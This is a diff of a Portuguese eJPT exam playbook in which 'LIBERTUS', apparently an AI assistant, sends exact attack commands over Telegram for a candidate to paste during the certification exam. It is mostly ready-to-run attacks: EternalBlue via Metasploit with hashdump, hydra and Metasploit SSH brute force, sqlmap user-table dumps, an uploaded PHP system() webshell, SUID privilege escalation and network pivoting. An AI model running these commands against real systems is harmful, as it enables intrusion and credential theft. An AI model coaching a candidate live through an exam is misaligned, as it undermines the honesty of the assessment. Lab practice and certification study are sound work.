@@ -1,233 +1,211 @@
-# CENÁRIOS eJPT — Playbooks Passo a Passo
-LIBERTUS · 2026-07-01 · comandos exatos que vou mandar pro Lorran no Telegram.
-Regra de ouro: **1 linha de contexto + 1 comando + "me manda o output"**. Sem enrolação.
-`<IP>` = alvo · `<KALI>` = meu IP (do `ip addr`).
+# CENÁRIOS eJPT — Passo a Passo
+Atualizado 2026-10-14 (véspera do exame). Cada cenário = comandos EXATOS que LIBERTUS manda pro Lorran colar.
+Substituir `IP`=alvo, `LHOST`=IP do Kali (`ip addr`).
 
 ---
 
-## CENÁRIO A — Porta 445 aberta (SMB) → MS17-010 EternalBlue
+## CENÁRIO A — Porta 445 aberta (SMB → MS17-010 / EternalBlue)
+**O mais cobrado no eJPT.**
 
-**Passo 1 — confirmar a vuln:**
+**Passo 1 — Identificar o Windows e confirmar a vuln**
 ```bash
-nmap -p445 --script smb-vuln-ms17-010 <IP>
+nmap -p445 --script smb-os-discovery,smb-vuln-ms17-010 IP
 ```
-→ me manda o output. Se disser "VULNERABLE" seguimos.
+→ Se aparecer `VULNERABLE: Remote Code Execution (MS17-010)` = go.
 
-**Passo 2 — pegar meu IP:**
+**Passo 2 — Explorar (oneliner p/ evitar copy/paste múltiplo)**
 ```bash
-ip addr
+msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS IP; set LHOST LHOST; run"
 ```
-→ me manda (preciso do IP do Kali para o LHOST).
 
-**Passo 3 — explorar (ONELINER, cola tudo de uma vez):**
+**Passo 3 — Já no meterpreter (SYSTEM):**
 ```bash
-msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS <IP>; set LHOST <KALI>; run"
-```
-→ me manda o output. Se abrir "meterpreter >" ganhamos shell.
-
-**Passo 4 — pós-exploração:**
-```
 getuid
 sysinfo
-```
-Se `getuid` = NT AUTHORITY\SYSTEM → somos admin. Para pegar flag:
-```
+hashdump
 shell
-type C:\Users\Administrator\Desktop\flag.txt
 ```
+Depois: `type C:\Users\Administrator\Desktop\flag.txt` (ou procurar flag/proof).
 
-**Se der "Cannot reliably check exploitability":** manda no msf `set ForceExploit true` e `run`.
-**Se SMB não confirmar ms17-010:** testar `smb-os-discovery` p/ versão, e enumerar shares:
-`nmap -p445 --script smb-enum-shares,smb-enum-users <IP>`
+**Se falhar:** `set ForceExploit true` e `run` de novo. Ou usar `use auxiliary/scanner/smb/smb_ms17_010` pra reconfirmar.
 
 ---
 
-## CENÁRIO B — Porta 21 aberta (FTP) → anônimo + creds fracas
+## CENÁRIO B — Porta 21 aberta (FTP anonymous + credenciais fracas)
 
-**Passo 1 — testar login anônimo:**
+**Passo 1 — Testar anônimo**
 ```bash
-nmap -p21 --script ftp-anon <IP>
+nmap -p21 --script ftp-anon IP
 ```
-→ se aparecer "Anonymous FTP login allowed", entramos.
 
-**Passo 2 — entrar e listar tudo:**
+**Passo 2 — Entrar e baixar tudo**
 ```bash
-ftp <IP>
-```
-Login: `anonymous` · senha: (só Enter). Depois:
-```
+ftp IP
+# Name: anonymous
+# Password: (Enter vazio)
 ls -la
-```
-→ me manda o que aparecer. Procuramos: .txt (dicas/creds), webshells (.aspx/.php), backups.
-
-**Passo 3 — baixar arquivos interessantes:**
-```
 get updates.txt /tmp/updates.txt
-get config.txt /tmp/config.txt
-bye
+get flag.txt /tmp/flag.txt
+exit
+cat /tmp/updates.txt
 ```
-Depois: `cat /tmp/updates.txt` → me manda.
-(Na sessão real, updates.txt tinha a dica "usernames = passwords".)
+→ Arquivos costumam ter dicas ("usernames = passwords") e credenciais.
 
-**Passo 4 — se tiver webshell (.aspx/.php) no dir web:**
-Abrir no Chrome: `http://<IP>/cmdasp.aspx` → executa comandos Windows no campo de texto.
-`ipconfig /all`, `whoami`, `arp -a`.
+**Passo 3 — Se achar webshell (.aspx/.php) no FTP + IIS/Apache:**
+Acessar via Chrome: `http://IP/cmdasp.aspx` → executar `whoami`, `ipconfig /all`, `arp -a`.
 
-**Passo 5 — se não achou nada, brute force com creds fracas:**
+**Passo 4 — Credenciais fracas (só se alvo pequeno/óbvio):**
 ```bash
-hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<IP> -t 4 -f
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://IP -t 4 -f
 ```
-Antes disso testar manual: admin/admin, root/root, ftp/ftp, anonymous.
+Sempre testar credenciais achadas em OUTROS serviços (SSH, CMS) — reuso é tema do exame.
 
 ---
 
-## CENÁRIO C — Porta 80/8080 aberta (web) → gobuster + sqli + webshell
+## CENÁRIO C — Porta 80/8080 aberta (web → gobuster + SQLi + webshell)
 
-**Passo 1 — identificar o app:**
+**Passo 1 — Mapear o app**
 ```bash
-nmap -p80 --script http-title,http-headers,http-enum <IP>
+nmap -p80,8080 --script http-enum,http-title IP
+whatweb http://IP        # se disponível
+curl -s -I http://IP
 ```
-→ me manda. Vejo se é WordPress, Drupal, app custom.
 
-**Passo 2 — enumerar diretórios:**
+**Passo 2 — Enumerar diretórios**
 ```bash
-gobuster dir -u http://<IP> -w /usr/share/wordlists/common.txt -x php,txt,bak -t 30 -q
+gobuster dir -u http://IP -w /usr/share/wordlists/common.txt -x php,txt,html -t 50
 ```
-→ me manda. Foco em: /admin, /login, /upload, /config, arquivos .bak.
+→ Procurar /admin, /login.php, /uploads, /phpmyadmin, /wp-admin.
 
-**Passo 3 — SQL injection (se achar página com ?id= ou login):**
+**Passo 3 — WordPress? (acessa via vhost às vezes)**
 ```bash
-sqlmap -u "http://<IP>/page.php?id=1" --batch --dbs
+curl -s -H "Host: wordpress.local" http://IP/ | grep -i themes
+nmap -p80 --script http-wordpress-enum IP
 ```
-Depois extrair users:
-```bash
-sqlmap -u "http://<IP>/page.php?id=1" -D nomedb -T users --dump --batch
-```
-→ me manda tabela de usuários/senhas.
 
-**Passo 4 — upload de webshell (se achar /upload ou file upload):**
-PHP webshell simples:
-```php
-<?php system($_GET['c']); ?>
+**Passo 4 — SQL Injection**
+```bash
+sqlmap -u "http://IP/page.php?id=1" --batch --dbs
+sqlmap -u "http://IP/page.php?id=1" --batch -D BANCO --tables
+sqlmap -u "http://IP/page.php?id=1" --batch -D BANCO -T users --dump
 ```
-Salvar como shell.php, subir, acessar: `http://<IP>/uploads/shell.php?c=id`
-(⚠️ no lab INE o "?" não digita no terminal — acessar URL na barra do Chrome.)
 
-**Passo 5 — se for WordPress:**
+**Passo 5 — Upload de webshell (se houver /upload)**
 ```bash
-curl -s -H "Host: wordpress.local" http://<IP>/ | grep -i themes
+# criar shell PHP
+echo '<?php system($_GET["c"]); ?>' > /tmp/sh.php
+# subir via formulário, depois:
+# no Chrome: http://IP/uploads/sh.php?c=id   (usar barra do Chrome se terminal não digita "?")
 ```
-Para Drupal → Drupalgeddon2:
-```bash
-msfconsole -q -x "use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS <IP>; set TARGETURI /drupal; run"
-```
+Depois de RCE → reverse shell (ver Netcat no cheatsheet).
 
 ---
 
-## CENÁRIO D — Porta 22 aberta (SSH) → creds + brute force
+## CENÁRIO D — Porta 22 aberta (SSH → bruteforce + chaves)
 
-**Passo 1 — banner e versão:**
+**Passo 1 — Banner/versão**
 ```bash
-nmap -p22 -sV <IP>
+nmap -p22 -sV IP
 ```
 
-**Passo 2 — SEMPRE testar creds achadas antes de brutar.**
-Se algum arquivo/CMS deu usuário:senha, testar direto:
+**Passo 2 — Antes de brutar: TENTAR credenciais já achadas**
 ```bash
-ssh usuario@<IP>
+ssh usuario@IP        # ex: auditor:auditor, ou user achado em arquivo FTP
 ```
-Reutilização de credenciais é TEMA RECORRENTE no eJPT.
+Reuso de credencial resolve mais rápido que hydra.
 
-**Passo 3 — brute force direcionado (NÃO rockyou inteiro em SSH — leva horas):**
+**Passo 3 — Bruteforce (só com user conhecido e wordlist enxuta)**
 ```bash
-# lista curta de users prováveis:
-hydra -L /tmp/users.txt -P /tmp/pass_curta.txt ssh://<IP> -t 4 -f -V
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://IP -t 4 -f
+# com lista de users:
+hydra -L users.txt -P pass.txt ssh://IP -t 4 -f
 ```
-Ou via metasploit:
+**Pitfall:** rockyou completo em SSH é lento demais. Se demorar, cortar e usar credenciais achadas.
+**Se o hydra local não tiver módulo SSH** (caso do apoio local do LIBERTUS — no Kali da INE funciona normal):
 ```bash
-msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS <IP>; set USERNAME root; set PASS_FILE /usr/share/wordlists/rockyou.txt; set STOP_ON_SUCCESS true; run"
+# MSF (recomendado)
+msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS IP; set USERNAME root; set PASS_FILE /usr/share/wordlists/rockyou.txt; set STOP_ON_SUCCESS true; set THREADS 4; run"
+# ou nmap
+nmap -p22 --script ssh-brute --script-args passdb=/usr/share/wordlists/rockyou.txt,userdb=users.txt IP
+# ou wrapper local
+bash ~/LIBERTUS/ejpt/sshbrute.sh IP root /usr/share/wordlists/rockyou.txt
 ```
 
-**Passo 4 — se achar chave SSH privada (id_rsa) em algum lugar:**
+**Passo 4 — Chave SSH encontrada (em FTP/web/backup)**
 ```bash
 chmod 600 id_rsa
-ssh -i id_rsa usuario@<IP>
-# se a chave tiver senha:
-ssh2john id_rsa > /tmp/keyhash
-~/LIBERTUS/ejpt/john_home/jl.sh /tmp/keyhash
+ssh -i id_rsa usuario@IP
+# chave com passphrase → quebrar:
+ssh2john id_rsa > hash.txt
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-**Passo 5 — dentro do SSH, privesc:**
+**Passo 5 — Já dentro → escalar**
 ```bash
-id; sudo -l; find / -perm -4000 2>/dev/null
-# SUID find → root:
-/usr/bin/find . -exec /bin/sh -p \; -quit
+sudo -l
+find / -perm -4000 -type f 2>/dev/null
 ```
 
 ---
 
-## CENÁRIO E — Rede /24 descoberta → PIVOTING (Metasploit)
+## CENÁRIO E — Rede /24 descoberta (PIVOTING com Metasploit)
+**Obrigatório no exame.** Contexto: você comprometeu um host de borda que tem 2 placas de rede.
 
-Este foi o GAP da 1ª tentativa. Fluxo completo:
-
-**Passo 1 — já tenho sessão meterpreter num host (ex: .52). Descobrir a rede interna:**
-No meterpreter cai no shell e roda:
-```
-ipconfig /all      (Windows)   OU   ip addr; ip route   (Linux)
+**Passo 1 — Confirmar a 2ª rede (dentro da sessão meterpreter/shell)**
+```bash
+# Windows:
+ipconfig /all          # olhar "DNS Servers" e IP da 2ª interface
 arp -a
+route print
+# Linux:
+ip addr; ip route; arp -a
 ```
-→ me manda. Procuro um 2º range (ex: DNS Server 192.168.0.2 → rede 192.168.0.0/24).
+→ Ex: DNS aponta 192.168.0.2 → rede interna 192.168.0.0/24.
 
-**Passo 2 — adicionar rota (do meterpreter, com a sessão em background):**
-```
+**Passo 2 — Rota automática pra rede interna**
+```bash
+# no meterpreter:
 run autoroute -s 192.168.0.0/24
-```
-Ou:
-```
+# alternativa manual (background primeiro):
 background
-use post/multi/manage/autoroute
-set SESSION 1
-set SUBNET 192.168.0.0
-run
+route add 192.168.0.0 255.255.255.0 1
+route print
 ```
 
-**Passo 3 — scan da rede interna PELA rota:**
-```
+**Passo 3 — Escanear a rede interna através do pivot**
+```bash
 use auxiliary/scanner/portscan/tcp
-set RHOSTS 192.168.0.1-254
-set PORTS 22,80,445,3389,10000
+set RHOSTS 192.168.0.0/24
+set PORTS 21,22,80,139,445,3306,3389,10000
 run
 ```
-→ me manda os hosts/portas que aparecerem.
 
-**Passo 4 — port forward para atacar host interno direto:**
+**Passo 4 — Port forward pra atacar serviço interno do Kali**
+```bash
+# no meterpreter:
+portfwd add -l 3389 -p 3389 -r 192.168.0.10
+portfwd list
+# agora 127.0.0.1:3389 do Kali = 3389 do host interno
 ```
-sessions -i 1
-portfwd add -l 3389 -p 3389 -r 192.168.0.50
-```
-Agora `127.0.0.1:3389` no Kali → chega no .50 interno.
 
-**Passo 5 — socks proxy + proxychains (ferramentas externas):**
-```
+**Passo 5 — SOCKS + proxychains (usar nmap/hydra na interna)**
+```bash
 use auxiliary/server/socks_proxy
 set VERSION 4a
+set SRVPORT 1080
 run
+# depois, fora do msf:
+proxychains nmap -sT -Pn -p445 192.168.0.10
 ```
-Editar `/etc/proxychains.conf` → `socks4 127.0.0.1 1080`. Depois:
-```bash
-proxychains nmap -sT -Pn -p 445 192.168.0.50
-proxychains msfconsole      # exploits pela rota
-```
-
-**Comandos-chave para questões teóricas:** `autoroute` (adicionar rota),
-`portfwd` (encaminhar porta), `socks_proxy`+`proxychains` (tunelar ferramentas).
+→ Repetir cenários A-D nos hosts internos descobertos (ex: Webmin porta 10000 é clássico interno).
 
 ---
 
-## Regras transversais (TODOS os cenários)
-1. **Sempre começar com nmap na rede inteira.** `nmap -sn` depois `-sV` em cada host.
-2. **Anotar tudo:** IPs, portas, versões, credenciais. Cada questão puxa desses dados.
-3. **Reutilizar credenciais em TODOS os serviços** — tema recorrente do exame.
-4. **48h é muito tempo** — não apressar, mas não travar: após 2 tentativas falhas no mesmo vetor, trocar.
-5. **Copy/paste bugado no lab INE** → usar oneliner `msfconsole -q -x`, webshell, ou Telegram.
-6. **Caractere "?" não digita no Kali INE** → URLs com ? na barra do Chrome, ou python3 -c.
+## FLUXO GERAL DO EXAME (ordem mental)
+1. `ip addr` → descobrir rede.
+2. `nmap -sn RANGE.0/24` → hosts vivos.
+3. `nmap -sV -p-` em cada host → serviços.
+4. Por porta aberta → cenário correspondente (A-E acima).
+5. Achou credencial? Testar em TODOS os serviços.
+6. Host com 2 redes? → Cenário E (pivot).
+7. Anotar TUDO: IPs, portas, users, senhas, flags.
